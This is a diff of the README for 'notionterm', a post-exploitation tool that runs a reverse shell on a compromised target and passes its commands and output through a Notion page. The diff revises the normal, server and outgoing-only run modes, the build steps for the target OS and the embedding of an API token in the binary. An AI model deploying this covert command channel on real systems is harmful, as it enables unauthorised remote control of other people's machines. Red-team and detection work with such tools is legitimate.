@@ -24,7 +24,6 @@
   <li>Quick proof insertion within report</li>
   <li>High available and shareable reverse shell (desktop, browser, mobile)</li>
   <li>Encrypted and authenticated remote shell</li>
-
 </ul> 
 </div>
 <div align=left>
@@ -32,6 +31,7 @@
 <ul>
   <li>Long and interactive shell session (see <a href=https://github.com/ariary/tacos>tacos</a> for that)</li>
 </ul>
+</div>
 
 ---
 <div align=left>
@@ -46,7 +46,7 @@ Just use notion as usual and launch <code>notionterm</code> on target.
 <h3 >Requirements 🖊️</h3>
  <ul>
   <li>Notion software and API key</li>
-  <li>Allowed HTTP communication between the target and notion domain</li>
+  <li>Allowed HTTP communication from the target to the notion domain</li>
   <li>Prior RCE on target</li>
 </ul> 
 </div>
@@ -58,49 +58,63 @@ roughly inspired by the great idea of <a href="https://github.com/mttaggart/Offe
 
 ## Quickstart
 
-**Set-up**
-1. Create the "reverse shell" page in Notion: [Page template](https://fluff-grade-468.notion.site/notionterm-template-19dc9d0bbae04f40b56c475f8cd79607)
-2. Give the permissions to `notionterm` to access the page (with the notion api key)
-
-**Run** ([details](#-run))
-
-3. Start `notionterm`
-4. Activate the reverse shell (with the button `ON`)
-5. do your reverse shell stuff
-6. Shutdown the reverse shell (`OFF`)
+### 🏗️ Set-up
+1. Create a page and give to the integration API key the permissions to have write access to the page
+2. Build `notionterm` and transfer it on target machine (see [install](#install))
 
 ### 👟 Run
 
-```shell
-# On target with prior RCE
-./notionterm
-```
+There are 3 main ways to run `notionterm`:
 
-Configuration can be made using:
-- Flags
-- Configuration table in notion page
+<details>
+  <summary><b>"normal" mode</b><br><i>Get terminal, stop/unstop it, etc...</i></summary>
+<code>
+notionterm [flags]
+</code><br>
+Start the shell with the button widget: turn <code>ON</code>, do you reverse shell stuff, turn <code>OFF</code> to pause, turn <code>ON</code> to resume etc...
+</details>
 
-#### Server mode
-To quickly obtain terminal in any notion page you can use the server mode (Requirement: *integration w/ write access to the page*)
-
-**First**, Launch notionterm on target with server mode enable:
-```shell
-notionterm -serve [flags]
-```
-**Then**, when/where you want to get a terminal in your notion page create an embed block with url containing the page id *(`CTRL+L`to get it)*: `https://[TARGET_URL]/notionterm?url=[PAGE_ID]`.
-
-Wait..
-
-**And that's all!**
-
-### Outgoing mode
-**+**: only target -> notion page flux *(.i.e No need to have a HTTP server reachable on target)*
-```shell
-notionterm -outgoing [flags]
-```
-Launch notionterm and immediatly request notion page to retrieve command to execute (do not wait the button to be clicked).
+<details>
+  <summary><b>"server" mode</b><br><i>Ease notionterm embedding in any page</i></summary>
+<code>
+notionterm --server [flags]
+</code><br>
+Start a shell session in any page by creating an embed block with URL containing the page id <i>(<code>CTRL+L</code>to get it)</i>: <code>https://[TARGET_URL]/notionterm?url=[NOTION_PAGE_ID]</code>.
+</details>
 
 
+<details>
+  <summary><b><code>light</code> mode</b><br><i>Only perform HTTP traffic from target → notion</i></summary>
+<code>
+notionterm light [flags]
+</code>
+</details>
 
 ## Install
-* **From release**: `curl -lO -L https://github.com/ariary/notionterm/releases/latest/download/notionterm && chmod +x notionterm`
+
+As `notionterm` is aimed to be run on target machine it must be built to fit with it.
+
+Thus set env var to fit with the target requirement:
+```shell
+GOOS=[windows/linux/darwin]
+```
+
+### Simple build
+```shell
+git clone https://github.com/ariary/notionterm.git && cd notionterm
+GOOS=$GOOS go build notionterm.go
+```
+
+### "all-inclusive" build
+Embed directly the notion integration API token and notion page url in the binary. ⚠️ everybody with access to the binary can retrived the token. For security reason don't share it and remove it after use.
+
+Set according env var:
+```shell
+export NOTION_PAGE_URL=[NOTION_PAGE_URL]
+export NOTION_TOKEN=[INTEGRATION_NOTION_TOKEN]
+```
+And build it:
+```
+git clone https://github.com/ariary/notionterm.git && cd notionterm
+./static-build.sh $NOTION_PAGE_URL $NOTION_TOKEN $GOOS go build notionterm.go
+```
